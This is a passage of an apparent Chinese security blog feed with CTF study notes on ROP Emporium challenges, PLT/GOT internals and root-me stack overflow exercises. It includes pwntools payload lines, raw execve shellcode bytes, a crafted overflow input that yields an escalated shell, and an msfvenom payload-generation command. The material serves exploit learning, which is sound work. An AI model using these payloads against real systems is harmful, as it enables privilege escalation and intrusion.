class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><p><code>man 7 ascii</code><br>查看ascii表</p><p><code>ropper --file ./badchars32 -b 6167782e</code><br>ropper排除badchars是这样用的，ROPgadget也是一样的</p><p>gdb_peda: <code>查看溢出点</code></p><pre><code>gdb-peda$ pattern_create 100gdb-peda$ pattern_offset AFAAAFAA found at offset: 44</code></pre><p><code>pwndbg&gt; rop --grep xor -- --badbytes 6167782e --ropchain --nojop</code></p><h3 id="寄存器解析"><a href="#寄存器解析" class="headerlink" title="寄存器解析"></a>寄存器解析</h3><p>bl is the name of the low 8 bits (bits 7-0) in the ebx register. There is also bh which is the bits 15-8 of ebx, and bx is the low 16 bits (bits 15-0). There is no name for the higher 16 bits.</p><p>This applies to all of the registers eax, ebx, ecx and edx.<br>搞错了，bl不是ebp中，而是ebx<br><a href="https://blog.csdn.net/ww506772362/article/details/75530723">https://blog.csdn.net/ww506772362/article/details/75530723</a></p><p>疑问：<br>我第一次传xor 参数ebx 的时候是00 00 00 8a , 放在栈中是00 00 00 8a , pop ebx , 是倒取读入?<br>所以是8a 00 00 00</p><p>EBP: 0x41304141 (‘AA0A’)</p><h3 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h3><h3 id="r14b"><a href="#r14b" class="headerlink" title="r14b"></a>r14b</h3><p>r14 r14d r14w r14b<br>有个坑<br>x的位置刚好是2e会被替换</p><p><code>Failed to open file: flag.t\xebt</code></p><p>目前没有找到可以用的gadget</p><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>同样没有有用的gadget<br>mov [e?x],<br>xchg  [ecx],dl<br>pext edx, ebx, eax</p><p>pext 解析<br><a href="https://blog.csdn.net/qq_43401808/article/details/86540472">https://blog.csdn.net/qq_43401808/article/details/86540472</a></p><p>这条命令能用，但是没有<code>pop eax</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ROP Emporium write4,badchars,fluff&lt;br&gt;write4和badchars都解出来了，fluff找不到有用的gadget&lt;br&gt;代码：&lt;a href=&quot;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&quot;&gt;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium前三题</title>
    <link href="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/"/>
    <id>http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/</id>
    <published>2021-01-11T06:27:27.000Z</published>
    <updated>2021-01-11T06:30:50.851Z</updated>
    
    <content type="html"><![CDATA[<p>简单的ROP学习，没有开启PIE</p><h2 id="Bypassing-NX-bit-using-chained-return-to-libc"><a href="#Bypassing-NX-bit-using-chained-return-to-libc" class="headerlink" title="Bypassing NX bit using chained return-to-libc"></a>Bypassing NX bit using chained return-to-libc</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p><p>system address + exit address + system+args<br>exit相当于下一步地址，因为不是调用call, 不会压入下一步地址</p><a id="more"></a><p>chaining seteuid, system and exit</p><p>问题：<br>1 seteuid_arg should be<code> zero</code><br>2 place function argument of both libc functions，，， a function argument of one libc function and an address of another libc function which is obviously not possible</p><p>seteuid_addr + system_addr + <code>seteuid_addr / exit_addr </code>+ system_arg<br> seteuid_addr / exit_addr 这里冲突了，当然是可以舍弃exit的</p><p>解决问题2：<br><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a><br>ESP Lifting<br><code>Frame Faking</code></p><p>esp lifting technique binary should be compiled without frame pointer (-fomit-frame-pointer) support.</p><p>Frame Faking：</p><pre><code>用“leave ret” instruction 覆盖返回地址leave = mov esp,ebp ; pop ebpret = pop EIP</code></pre><p><a href="https://imgchr.com/i/sMz61K"><img src="https://s3.ax1x.com/2021/01/09/sMz61K.png" alt="sMz61K.png"></a></p><p>第一次执行leave;ret时，此时ebp已经是fake_ebp1的地址值，执行完leave后，esp是seteuid_addr的地址，ebp是fake_ebp2的地址值，执行ret后，将<code>seteuid_addr推向eip</code>，参数在ebp+0x4；之后同理，可以执行system()</p><p>解决问题1：<br>strcpy which copies a NULL byte into seteuid_arg’s stack location<br>using sprintf NULL byte is copied in to seteuid_arg’s stack location</p><p>ROP<br>system(“/bin/sh”)</p><p>push binsh_addr<br>call system</p><p>call system=<br>push eip+5<br>jmp system</p><p>所以栈中system地址要和参数隔四个字节，因为中间还要放返回地址</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</a></p><h3 id="ROP定义："><a href="#ROP定义：" class="headerlink" title="ROP定义："></a>ROP定义：</h3><p>utilizing <strong>small instruction sequences **available in either the binary or libraries linked to the application called **gadgets</strong></p><p>ROP gadgets are small instruction sequences <strong>ending with a “ret” instruction “c3”</strong>.</p><p>The ROP gadget has to end with a “ret” to enable us to perform multiple sequences. Hence it is called** return oriented.**<br>所以才叫return , gadget后面都跟着ret</p><h3 id="有用的gadget"><a href="#有用的gadget" class="headerlink" title="有用的gadget"></a>有用的gadget</h3><p>1- We search the binary for all “ret” (c3) byte.<br>2- We go backwards to see if the previous byte contains a valid instruction. We reverse to the maximum number of bytes that can make a valid instruction (20 bytes).<br>3- We then record all valid instruction sequences found in the binary or linked libraries.</p><h4 id="Loading-a-constant-into-register"><a href="#Loading-a-constant-into-register" class="headerlink" title="Loading a constant into register"></a>Loading a constant into register</h4><p>POP eax; ret;</p><p>栈;<br>Address of POP EAX/RET gadget<br>0xdeadbeef<br>Address of next gadget</p><h4 id="Loading-from-memory"><a href="#Loading-from-memory" class="headerlink" title="Loading from memory"></a>Loading from memory</h4><p>mov ecx,[eax]; ret</p><h4 id="Storing-into-memory"><a href="#Storing-into-memory" class="headerlink" title="Storing into memory"></a>Storing into memory</h4><p>Mov [eax],ecx; ret</p><h4 id="Arithmetic-operations"><a href="#Arithmetic-operations" class="headerlink" title="Arithmetic operations"></a>Arithmetic operations</h4><p>add eax,0x0b; ret<br>xor edx,edx;ret</p><h4 id="System-call"><a href="#System-call" class="headerlink" title="System call"></a>System call</h4><p>int 0x80; ret<br>call gs:[0x10]; ret</p><h4 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h4><p>what libs are linked to the binary<br>gdb:<br><code>info files</code></p><pre><code>ps -aux | grep rop2cat /proc/28119/maps</code></pre><p> system call number of execve() is “11” or “0xb”<br> linux system call numbers in “/usr/include/i386-linux-gnu/asm/unistd_32.h “<br>grep execve</p><p>it wont affect the command “/bin/sh” is as<br>“/bin//sh”.</p><p><code>ROPradget --strings </code></p><h2 id="学习ROP的练习平台ropemporium"><a href="#学习ROP的练习平台ropemporium" class="headerlink" title="学习ROP的练习平台ropemporium"></a>学习ROP的练习平台ropemporium</h2><p><a href="https://ropemporium.com/index.html">https://ropemporium.com/index.html</a></p><p>起手式命令；；</p><h3 id="Confirming-protections"><a href="#Confirming-protections" class="headerlink" title="Confirming protections"></a>Confirming protections</h3><pre><code>$ rabin2 -I &lt;binary&gt;$ pwn checksec &lt;binary&gt;</code></pre><h3 id="Function-names-符号表symbols"><a href="#Function-names-符号表symbols" class="headerlink" title="Function names 符号表symbols"></a>Function names 符号表symbols</h3><pre><code>$ rabin2 -i &lt;binary&gt;$ nm -u &lt;binary&gt;$ nm ret2win|grep &#39; t &#39;Listing just those functions written by the programmer is harder, a rough approximation could be:$ rabin2 -qs &lt;binary&gt; | grep -ve imp -e &#39; 0 &#39;-s              symbolsgrep-q              be quiet, just show fewer data-v, --invert-match        select non-matching lines-e, --regexp=PATTERNS     use PATTERNS for matching</code></pre><h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>查找程序中字符串</p><ol><li><p><code>strings -d ./ret2win32</code></p></li><li><p><code>$ rabin2 -z split</code><br>偏移地址都给出了</p></li><li><p><code>ROPgadget --bianry --strings &#39;/bin/sh&#39;</code></p></li></ol><p>dmesg [options]<br>Display or control the kernel ring buffer.<br>For a quick and dirty confirmation of how many bytes are needed to cause an overflow </p><h3 id="题目：："><a href="#题目：：" class="headerlink" title="题目：："></a>题目：：</h3><p><a href="https://blog.csdn.net/SmalOSnail/article/details/106619419">https://blog.csdn.net/SmalOSnail/article/details/106619419</a><br><a href="https://github.com/TaQini/rop_emporium/blob/master/tasks">https://github.com/TaQini/rop_emporium/blob/master/tasks</a><br>大佬代码</p><p><a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a><br>我的解题代码</p><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p><code>p.sendlineafter(&#39;&gt;&#39;,b&#39;A&#39;*40+p64(0x00400756))</code><br>不用考虑截断？？ pwntools自行解决，厉害👍</p><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>32位<br>    payload += p32(system) +b’a’*4+ p32(catflag)<br>中间应该再加四个字节，作为返回地址</p><p>64位下传参</p><pre><code>[0x00400742]&gt; pdf┌ 17: sym.usefulFunction ();│           0x00400742      55             push rbp│           0x00400743      4889e5         mov rbp, rsp│           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; &quot;/bin/ls&quot; ; const char *string│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)│           0x00400750      90             nop│           0x00400751      5d             pop rbp└           0x00400752      c3             ret</code></pre><p>字符串传到了 <code>$edi</code></p><p>所以要报字符串地址传到RDI中<br><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching">https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching</a><br><a href="https://trustfoundry.net/basic-rop-techniques-and-tricks/">https://trustfoundry.net/basic-rop-techniques-and-tricks/</a></p><h3 id="如何搜索gadget"><a href="#如何搜索gadget" class="headerlink" title="如何搜索gadget"></a>如何搜索gadget</h3><p><a href="https://ropemporium.com/guide.html">https://ropemporium.com/guide.html</a><br>五种工具，我用了radare2 和 ROPgadget</p><h4 id="radare2中"><a href="#radare2中" class="headerlink" title="radare2中"></a>radare2中</h4><pre><code>/R [?] — Search for ROP gadgets/R/ — Search for ROP gadgets with a regular expressions</code></pre><p>太暴力了</p><pre><code>[0x00400742]&gt; /R pop rdi  0x004007c3                 5f  pop rdi  0x004007c4                 c3  ret</code></pre><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><code>ROPgadget --binary   | grep</code></p><h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><p>32位</p><pre><code>ROPgadget --binary ./callme32 --only &#39;add esp&#39;callme1=p32(0x080484f0)callme2=p32(0x08048550)callme3=p32(0x080484e0)addpopret=p32(0x080484aa)#0x080484aa : add esp, 8 ; pop ebx ; retargs1=p32(0xdeadbeef)args2=p32(0xcafebabe)args3=p32(0xd00df00d)# rop1sgadget=addpopret+args1+args2+args3offset = 44payload = b&#39;A&#39;*offsetpayload += callme1+ gadget+  callme2+gadget+callme3+gadget</code></pre><p>64位<br>64位下传参</p><pre><code>│           0x0040091e      ba06000000     mov edx, 6│           0x00400923      be05000000     mov esi, 5│           0x00400928      bf04000000     mov edi, 4│           0x0040092d      e8eefdffff     call sym.imp.callme_one</code></pre><p>所以用<br>    #0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</p><h2 id="PLT-和-GOT-PLT"><a href="#PLT-和-GOT-PLT" class="headerlink" title="PLT 和 GOT.PLT"></a>PLT 和 GOT.PLT</h2><p> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a><br><code>函数和变量作为符号</code>被存在可执行文件中, 不同类型的符号又聚合在一起, 称为<code>符号表</code></p><p> <a href="https://ropemporium.com/guide.html#Appendix%20A">https://ropemporium.com/guide.html#Appendix%20A</a><br>how the PLT is used in <code>lazy binding</code>?<br>Lazy binding is a technique used by the dynamic linker<br>symbol lookups for function calls into shared objects are deferred until the first time a function is actually called.<br>对共享对象的函数调用的符号查找 只有当第一个函数真的调用时才查找<br>Two program sections are used to achieve this effect<br> the<code>procedure linkage table (.plt)</code>and part of the <code>global offset table (.got.plt).</code><br>Lazy binding may be disabled by setting the LD_BIND_NOW environment variable to a nonempty string or using the RTLD_NOW flag when calling dlopen().<br>The first time an external function is called it, <strong>must be resolved</strong>. After that, all calls to it will be passed straight through to the desired function<br><code>rabin2 -R    relocations</code></p><h3 id="plt-节"><a href="#plt-节" class="headerlink" title=".plt 节"></a>.plt 节</h3><p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>比如3 function stubs<br>take the form <code>jmp; push; jmp</code>;. Above the stubs a <code>push; jmp;</code></p><pre><code>► 0x8049030  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804c00c&gt; </code></pre><p>间接跳转</p><pre><code> pwndbg&gt; x/wx 0x804c00c 0x804c00c &lt;puts@got.plt&gt;:    0x08049036   0x8049036  &lt;puts@plt+6&gt;                push   0   0x804903b  &lt;puts@plt+11&gt;               jmp    0x8049020 &lt;0x8049020&gt;</code></pre><p>it turns out that because we haven’t called puts before<br><strong>还没有使用puts，跳转到got又跳回到下一命令</strong><br>最后回到<code>.plt</code>表开头<br>      0x8049020                              push   dword ptr [<em>GLOBAL_OFFSET_TABLE</em>+4] &lt;0x804c004&gt;<br>     ► 0x8049026                              jmp    dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt;</p><pre><code>pwndbg&gt; x/2xw 0x804c0040x804c004:    0xf7ffd980    0xf7fe9730</code></pre><p>第一个在连接器数据段是<code>link_map地址</code>，第二个在连接器执行代码处是<code>_dl_runtime_resolve地址</code><br>plt开头两个是来第一次运行时查地址的</p><p>因此, 实际上(第一次)调用puts@plt就相当于调用了<br><code>_dl_runtime_resolve((link_map *)m, 0)!</code> 其中link_map提供了运行时的必要信息,<br>而0则是puts函数的偏移<code>(在puts@plt中push 0x0)</code>.</p><p>resolve执行完后：：<br>    pwndbg&gt; disass ‘puts@plt’<br>    Dump of assembler code for function puts@plt:<br>       0x08049030 &lt;+0&gt;:    jmp    DWORD PTR ds:0x804c00c<br>       0x08049036 &lt;+6&gt;:    push   0x0<br>       0x0804903b &lt;+11&gt;:    jmp    0x8049020<br>    End of assembler dump.</p><pre><code>pwndbg&gt; x/wx 0x804c00c0x804c00c &lt;puts@got.plt&gt;:    0xf7e303c0pwndbg&gt; info symbol 0xf7e303c0puts in section .text of /lib/i386-linux-gnu/libc.so.6</code></pre><p>找到puts的代码地址</p><h3 id="攻击防御"><a href="#攻击防御" class="headerlink" title="攻击防御"></a>攻击防御</h3><p>防止写got.plt表<br><code>Enter relocations read-only, or RELRO.</code></p><p>a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation</p><h3 id="got"><a href="#got" class="headerlink" title=".got"></a>.got</h3><p>This is the GOT, or Global Offset Table. This is the <code>actual table of offsets </code>as filled in by the linker for external symbols.<br>.plt<br>This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)<br>.got.plt<br>This is the GOT for the PLT. It contains the<code>target addresses</code>(after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section</p><p>.GOT 开头包含实际地址，.plt开头是要跳转到目标<br>pwndbg&gt; x/i $pc<br>=&gt; 0x804845f &lt;main+36&gt;:    call   0x8048300 &lt;puts@plt&gt;</p><p>.got.plt表内容<br>got0: 本ELF动态段(.dynamic段)的装载地址<br>got1: 本ELF的link_map数据结构描述符地址<br>got2: _dl_runtime_resolve函数的地址<br><a href="https://ropemporium.com/image/example_gotplt_section.png"><img src="https://ropemporium.com/image/example_gotplt_section.png"></a></p><hr><h2 id="x86-get-pc-thunk-ax"><a href="#x86-get-pc-thunk-ax" class="headerlink" title="__x86.get_pc_thunk.ax"></a>__x86.get_pc_thunk.ax</h2><p>objdump -d main_pi | grep “__x86.get_pc_thunk.ax” -A 2<br>000006ad &lt;__x86.get_pc_thunk.ax&gt;:<br> 6ad:    8b 04 24                 mov    eax,DWORD PTR [esp]<br> 6b0:    c3                       ret<br>作用就是把esp(即返回地址)的值保存在eax(PIC寄存器)中, 在接下来寻址用<br>详见<a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a></p><h2 id="CTF-WIKI-ROP"><a href="#CTF-WIKI-ROP" class="headerlink" title="CTF-WIKI ROP"></a>CTF-WIKI ROP</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/</a><br>ROP</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><code>gdb vmmap </code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单的ROP学习，没有开启PIE&lt;/p&gt;
&lt;h2 id=&quot;Bypassing-NX-bit-using-chained-return-to-libc&quot;&gt;&lt;a href=&quot;#Bypassing-NX-bit-using-chained-return-to-libc&quot; class=&quot;headerlink&quot; title=&quot;Bypassing NX bit using chained return-to-libc&quot;&gt;&lt;/a&gt;Bypassing NX bit using chained return-to-libc&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&quot;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;system address + exit address + system+args&lt;br&gt;exit相当于下一步地址，因为不是调用call, 不会压入下一步地址&lt;/p&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 5</title>
    <link href="http://finsenty54.github.io/2021/01/08/Stack_buffer_overflow_basic_5/"/>
    <id>http://finsenty54.github.io/2021/01/08/Stack_buffer_overflow_basic_5/</id>
    <published>2021-01-08T05:34:58.000Z</published>
    <updated>2021-01-08T05:35:42.406Z</updated>
    
    <content type="html"><![CDATA[<p>ELF x86 - Stack buffer overflow basic 5</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(fgets(buff, BUFFER, file) != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    chomp(buff);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buff, <span class="string">&quot;USERNAME=&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        cpstr(init.username, buff+<span class="number">9</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> init;</span><br></pre></td></tr></table></figure><a id="more"></a><p>数据读入buffer，<code>ebp-0x2a5</code>， 只能读512字符+’\n’。不能到EIP，但这段代码赋值到init，没有检查边界，init起始地址<code>ebp-0xa4 </code>，比较小好溢出。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>函数最后，会将本地变量init赋值到外部init所在地址，位于<code>$ebp+0x8</code>，值为<code>0xbffffb00</code>，因为buff最后’\n’变为’\00’，为了能够执行，shellcode最后还要加上<code>$ebp+0x8</code>，此时刚好有个’00’，所以不用加地址也能运行，但最后还是段错误。<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205</a><br>最后用到这篇的方法：<br><a href="https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/">https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</a></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><ol><li><code>wget https://raw.githubusercontent.com/Finsenty54/-python/master/findenv.c</code></li><li><code>gcc -o findenv findenv.c</code></li><li><code>export JUNK=(python -c &quot;print &#39;B&#39; * 1000&quot;)</code></li><li><code>export SHELCODE=(python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;)</code></li><li><code>/tmp/findenv JUNK ./ch10</code><br>JUNK will be at 0xbffffac2</li><li><code>/tmp/findenv SHELCODE ./ch10</code><br>SHELCODE will be at 0xbfffff4d</li><li><code>(python -c &quot;print &#39;USERNAME=&#39;+&#39;\x90&#39;*136+&#39;\x60\xb1\x04\x08&#39;+&#39;A&#39;*28+&#39;\x4d\xff\xff\xbf&#39;+&#39;\xc2\xfa\xff\xbf&#39;&quot;) &gt; /var/tmp/data.txt</code></li></ol><pre><code>app-systeme-ch10@challenge02:~$ ./ch10 /var/tmp/data.txtbash-4.4$ iduid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1110(app-systeme-ch10),100(users)bash-4.4$ cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - Stack buffer overflow basic 5&lt;/p&gt;
&lt;h2 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(fgets(buff, BUFFER, file) != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chomp(buff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(buff, &lt;span class=&quot;string&quot;&gt;&amp;quot;USERNAME=&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cpstr(init.username, buff+&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fclose(file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; init;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer and integer overflow</title>
    <link href="http://finsenty54.github.io/2021/01/07/Stack_buffer_and_integer_overflow/"/>
    <id>http://finsenty54.github.io/2021/01/07/Stack_buffer_and_integer_overflow/</id>
    <published>2021-01-07T08:30:11.000Z</published>
    <updated>2021-01-07T08:31:09.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-and-integer-overflow"><a href="#ELF-x86-Stack-buffer-and-integer-overflow" class="headerlink" title="ELF x86 - Stack buffer and integer overflow"></a>ELF x86 - Stack buffer and integer overflow</h1><p>永远的神：：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow</a></p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>为了让shell更实用<br>覆盖<code>EIP</code>, 使用现有的命令的地址，例如<code>jmp esp</code> ， 跳转buffer ， 后面是shellcode</p><h3 id="查找jmp-call-esp地址"><a href="#查找jmp-call-esp地址" class="headerlink" title="查找jmp/call esp地址"></a>查找jmp/call esp地址</h3><ol><li>可以在共享库中找</li><li>也可以在自身程序找命令<a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d vulnerable_1 | grep <span class="string">&quot;eax&quot;</span></span><br><span class="line"><span class="number">1019</span>:ff d0                call   *%eax</span><br></pre></td></tr></table></figure>或者启动<code>metasploit-framework</code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfelfscan -j eax vulnerable_1</span><br><span class="line">[*] exec: msfelfscan -j eax vulnerable_1</span><br><span class="line">[vulnerable_1]</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x00002019</span> call eax</span><br><span class="line"><span class="number">0x000020dc</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br><span class="line"><span class="number">0x0000302f</span> call eax</span><br></pre></td></tr></table></figure>“jmp/call eax”都行<br>use linux/x86/exec<h3 id="用msfvenom生成payload"><a href="#用msfvenom生成payload" class="headerlink" title="用msfvenom生成payload"></a>用msfvenom生成payload</h3><code>Msfvenom</code> 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。<br><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br><code>msfvenom -p linux/x86/exec CMD=dash R -a x86 -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python </code></li></ol><hr><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p><a href="https://sploitfun.wordpress.com/2015/06/23/integer-overflow/">https://sploitfun.wordpress.com/2015/06/23/integer-overflow/</a></p><p>Storing<code>a value greater</code>than <code>maximum supported value</code> is called integer overflow.  an integer overflow might <code>lead to stack overflow or heap overflow</code> which could result in arbitrary code execution.<br>对数组长度检查失效</p><p>Similarly storing a value lesser than the minimum supported value is called integer underflow.</p><p><code> 261</code> gets wrapped around and stored as 5 in ‘passwd_len’ variable<br><code>000100000101 取8位 为5</code></p><hr><h2 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 